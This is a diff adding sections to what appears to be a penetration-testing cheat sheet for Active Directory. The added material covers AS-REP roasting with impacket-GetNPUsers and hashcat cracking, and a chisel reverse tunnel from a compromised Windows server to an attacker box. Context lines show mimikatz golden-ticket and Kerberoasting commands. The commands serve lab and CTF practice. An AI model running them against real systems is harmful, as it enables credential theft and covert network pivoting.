@@ -869,6 +869,7 @@ mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-16028755
 where /rc4 is the hash
 
 ## Lateral Movement with Distributed Component Object Model (DCOM) 
+Also see impacket-dcomexec
 
 <details>
   <summary>Expand</summary>
@@ -1014,6 +1015,20 @@ hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
 GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
 ```
 </details>
+
+## ASREP Roast
+Get the TGT for users that have 'pre-authentication' set to not required. Basically we get the encrypted hash and try to crack it offline
+See:
+
+* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
+* https://tools.thehacker.recipes/impacket/examples/getnpusers.py
+* https://medium.com/@markmotig/dump-password-hashes-for-offline-cracking-by-forcing-as-rep-roasting-ca43f6e76cdd
+
+
+```
+impacket-GetNPUsers jab.htb/ -usersfile pidgin_users.txt -format hashcat -outputfile hashes.asreproast
+hashcat -m 18200 hashes.asreproast rockyou.txt
+```
 
 ## cPassword / Group Policy Preferences (GPP) Attacks
 
@@ -2208,6 +2223,22 @@ hts --foward-port localhost:8888 4444
 htc --forward-port 8080 10.10.10.10:4444
 ```
 4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)
+
+## chisel
+Assume we have a windows server that has a webserver that is only available locally (port 9090). We now want to setup a port forwarding so we can access this webserver using our attacker box.
+
+On attacker machine:
+```
+chisel server -p 9999 --reverse
+```
+
+On windows server:
+
+```
+.\chisel.exe client 10.10.14.14:9999 R:9090:127.0.0.1:9090
+```
+
+Now you can access the webpage under http://localhost:9090
 
 
 # AV Evasion
